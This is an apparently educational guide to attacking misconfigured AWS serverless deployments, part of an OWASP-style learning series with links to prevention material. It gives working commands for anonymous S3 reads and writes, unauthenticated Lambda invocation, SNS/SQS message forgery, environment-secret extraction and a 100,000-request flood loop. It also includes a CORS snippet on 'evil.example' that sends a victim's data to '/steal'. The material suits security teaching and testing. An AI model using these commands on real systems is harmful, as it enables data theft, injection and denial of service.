# SAS-3: Insecure Serverless Deployment Configuration - Attack Vectors

## Table of Contents
- [Understanding Serverless Misconfiguration Attack Vectors](#understanding)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Misconfigurations](#chaining)

## Understanding Serverless Misconfiguration Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in systems you own or are authorised to test.

Serverless misconfiguration is rarely exploited through a clever payload. It is exploited through **enumeration and observation**: an attacker guesses or scrapes a resource name, probes a public endpoint, reads what a policy grants, and walks through whichever door the deployment left open. Because the flaws live in settings—buckets, policies, URLs, keys—they are cheap to find at scale, and cloud resource names are often predictable (`company-prod-uploads`, `api-stage-dev`).

The attacker's goal in this category is usually one of:

- Read or write data through a public bucket or an over-broad resource policy.
- Invoke a function anonymously through a `NONE`-auth Function URL or a wildcard `InvokeFunction` grant.
- Extract secrets from plaintext environment variables or verbose logs.
- Abuse a missing throttle to drive cost and denial of service, or pivot through an over-privileged role.

### Core Attack Flow

```
1. Enumerate
   ↓
   Guess/scrape bucket names, Function URLs, API stages, topic/queue ARNs
2. Probe policy
   ↓
   Test anonymous read/write/invoke; read resource policy for Principal: "*"
3. Exploit
   ↓
   Pull data, invoke logic, read env vars/secrets, enqueue/publish events
4. Escalate / Exfiltrate
   ↓
   Use leaked secrets and over-broad roles to pivot across the account
```

## Common Attack Patterns

### 1. Public Bucket Enumeration and Read

Functions frequently stage input and output in S3. A public bucket becomes a data leak.

```bash
# Bucket names are often guessable from the app/env naming scheme
aws s3 ls s3://acme-prod-uploads --no-sign-request
# 2024-05-01 09:14:22  1048576 exports/customers-2024-05.csv

aws s3 cp s3://acme-prod-uploads/exports/customers-2024-05.csv . --no-sign-request
```

**Payoff**: anonymous download of backups, exports, and uploads—no credential, no exploit.

### 2. Public Bucket Write (Input Poisoning)

A public-write bucket lets the attacker plant objects a function later trusts.

```bash
aws s3 cp ./malicious.json s3://acme-prod-ingest/incoming/order.json --no-sign-request
# The ingest Lambda triggers on s3:ObjectCreated and processes attacker content
```

**Payoff**: the attacker controls the function's input, turning a storage misconfig into logic abuse.

### 3. Anonymous Lambda Function URL Invoke

A Function URL with `AuthType: NONE` is a public endpoint that runs the function for anyone.

```bash
curl -s https://abc123.lambda-url.us-east-1.on.aws/ \
  -H 'Content-Type: application/json' \
  -d '{"action":"exportAll"}'
# 200 OK — the function executed with no authentication
```

**Payoff**: direct, unauthenticated invocation of business logic. Discovery is easy—URLs leak in client code, logs, and referrers.

### 4. Wildcard Resource Policy Abuse

A resource-based policy with `Principal: "*"` grants the action to the entire world.

```bash
# The policy allows lambda:InvokeFunction for Principal "*"
aws lambda invoke --function-name process-orders \
  --payload '{"orderId":"*"}' /dev/stdout
# The same anti-pattern lets anyone sns:Publish or sqs:SendMessage
```

**Payoff**: cross-account or public invocation, publishing, and enqueuing—exactly the access the wildcard granted.

### 5. Public SNS / SQS Injection

Public topic and queue policies let attackers inject messages into internal pipelines.

```bash
aws sns publish --topic-arn arn:aws:sns:us-east-1:123:orders-events \
  --message '{"forged":"event"}'
aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/123/jobs \
  --message-body '{"job":"attacker-controlled"}'
```

**Payoff**: forged events flow into downstream functions that assume the queue is trusted.

### 6. Secret Extraction from Environment Variables

Plaintext secrets in the function configuration are readable by anyone with config access.

```bash
aws lambda get-function-configuration --function-name billing \
  --query 'Environment.Variables'
# {
#   "DB_PASSWORD": "S3cr3t-Pa55w0rd",
#   "STRIPE_KEY": "sk_live_51H..."
# }
```

**Payoff**: live credentials for databases and third-party services, enabling lateral movement.

### 7. Verbose Stages and Debug Logging

Over-logged API Gateway stages and debug output spill request bodies and internal detail.

```
# API Gateway stage with full request/response logging enabled:
- Logs include Authorization headers, tokens, and PII in request bodies
- A verbose "dev" stage left reachable in production
- Function logs echo entire event payloads and secrets
```

**Payoff**: secrets and sensitive payloads harvested from logs the attacker (or an over-broad role) can read.

### 8. Unrestricted CORS on Public Endpoints

`Access-Control-Allow-Origin: *`—or reflected origins with credentials—lets any site call the endpoint from a victim's browser.

```javascript
// Runs on evil.example while the victim is authenticated:
fetch('https://abc123.lambda-url.us-east-1.on.aws/me', { credentials: 'include' })
  .then(r => r.json())
  .then(d => navigator.sendBeacon('/steal', JSON.stringify(d)));
```

**Payoff**: cross-origin theft of any data the victim can reach through the endpoint.

### 9. Missing Throttling and Quotas (Cost / DoS)

Without throttling, every anonymous request is a bill and a denial-of-service lever.

```bash
# No 429, no quota — hammer the public endpoint:
for i in $(seq 1 100000); do
  curl -s https://abc123.lambda-url.us-east-1.on.aws/ >/dev/null &
done
```

**Payoff**: runaway concurrency, cost amplification, and exhaustion of downstream limits.

### 10. Missing Encryption in Transit

No `aws:SecureTransport` deny means clients may reach the resource over plain HTTP.

```
# Bucket policy lacks a deny on aws:SecureTransport = false
GET http://acme-prod-uploads.s3.amazonaws.com/exports/data.csv
# Content retrievable over unencrypted HTTP, exposed to interception
```

**Payoff**: man-in-the-middle interception of data between clients, functions, and resources.

### 11. Unnecessary Triggers

A function wired to more event sources than it needs widens the invocation surface.

```
process-payment is triggered by:
  - API Gateway  (intended)
  - a public S3 bucket ObjectCreated  (unnecessary, attacker-writable)
  - an SNS topic with a public policy  (unnecessary, attacker-publishable)
```

**Payoff**: attacker-controlled event sources invoke sensitive logic through the side door.

### 12. Over-Broad Deploy and Execution Roles

An over-privileged role turns one foothold into account-wide control.

```json
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

**Payoff**: a compromised function—or a leaked deploy credential—can read every resource, rewrite every policy, and create new backdoors.

## Chaining Misconfigurations

Individually minor issues combine into full compromise:

```
Public-write ingest bucket        -> plant a malicious object
        +
Function triggers on ObjectCreated -> attacker controls the event
        +
Plaintext DB_PASSWORD in env vars  -> function config leaks the credential
        =  data breach with no application code exploit required
```

Another common chain:

```
Guessable bucket name leaks a deploy artifact -> read serverless.yml + ARNs
        -> Function URL with AuthType: NONE is invoked anonymously
        -> over-broad execution role lists and reads every other bucket
        -> unrestricted CORS exfiltrates results to the attacker's page
```

## Key Takeaways

1. **Misconfiguration is exploited by enumeration, not payloads**—predictable names and open policies map the attack.
2. **Public storage and public policies are the front door**—`Principal: "*"`, public buckets, and `AuthType: NONE` need no exploit.
3. **Secrets in env vars and verbose logs are free credentials**—move them to a manager and quiet the logs.
4. **Missing throttling is a cost and DoS lever**—every anonymous request without a limit is abuse waiting to happen.
5. **Small issues chain**—a writable bucket plus a trigger plus a leaked secret equals a breach with no code bug at all.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build a private-by-default, scanned baseline
- **[Code Examples](examples.md)**: See secure serverless.yml, SAM, and IaC
- **[Serverless Learning Path](/learn/serverless)**: Continue the OWASP Serverless Top 10
- **[Practice Labs](/practice)**: Apply these techniques hands-on
